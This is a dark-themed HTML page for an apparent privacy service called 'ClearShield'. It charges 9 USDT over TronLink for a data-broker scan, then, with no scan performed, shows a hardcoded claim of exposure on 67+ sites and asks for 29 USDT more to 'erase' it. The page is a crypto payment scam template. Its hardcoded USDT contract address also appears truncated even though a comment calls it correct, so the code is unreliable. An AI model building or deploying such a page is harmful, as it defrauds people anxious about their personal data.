<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ClearShield – Privacy Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{margin:0;font-family:Arial;background:#0d0d0d;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;padding:20px}
    .c{max-width:420px;width:100%;text-align:center}
    h1{font-size:28px;margin-bottom:10px}
    p{font-size:15px;color:#aaa}
    .card{background:#161616;padding:30px;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
    button{background:#f4c24d;color:#000;border:none;padding:16px;font-size:18px;border-radius:10px;width:100%;margin-top:20px;font-weight:bold;cursor:pointer}
    #success{display:none;margin-top:30px}
  </style>
</head>
<body>
  <div class="c">
    <h1>ClearShield</h1>
    <p>Scan your digital exposure across 100+ data brokers and<br>remove your info permanently.</p>
    <div class="card">
      <button onclick="pay(9)">Start Scan – 9 USDT (TRC20)</button>
    </div>
    <div id="success" class="card">
      <p>Payment received! Your scan is complete.</p>
      <p>Found on 67+ data broker sites.</p>
      <button onclick="pay(29)" style="background:#d32f2f;color:#fff">Erase All – 29 USDT</button>
    </div>
  </div>

  <script>
    let wallet = "";

    // دریافت آدرس والت از سرور
    fetch('/config')
      .then(r => r.json())
      .then(d => wallet = d.wallet);

    async function pay(amount) {
      if (!window.tronWeb) {
        alert("Please install and unlock TronLink!");
        return;
      }

      try {
        const tronWeb = window.tronWeb;
        const usdtContract = "TR7NHqjeKQxGTCuuQdCA3f2Y2Y8pSQ9e6"; // آدرس صحیح USDT-TRC20

        const contract = await tronWeb.contract().at(usdtContract);
        const result = await contract.transfer(wallet, amount * 1000000).send({
          feeLimit: 40_000_000,
          callValue: 0
        });

        document.getElementById('success').style.display = 'block';
        alert("Payment successful! Thank you!");
      } catch (err) {
        console.log(err);
        if (err.message?.includes("rejection")) {
          alert("You cancelled the transaction.");
        } else {
          alert("Transaction failed: " + (err.message || "Unknown error"));
        }
      }
    }
  </script>
</body>
</html>
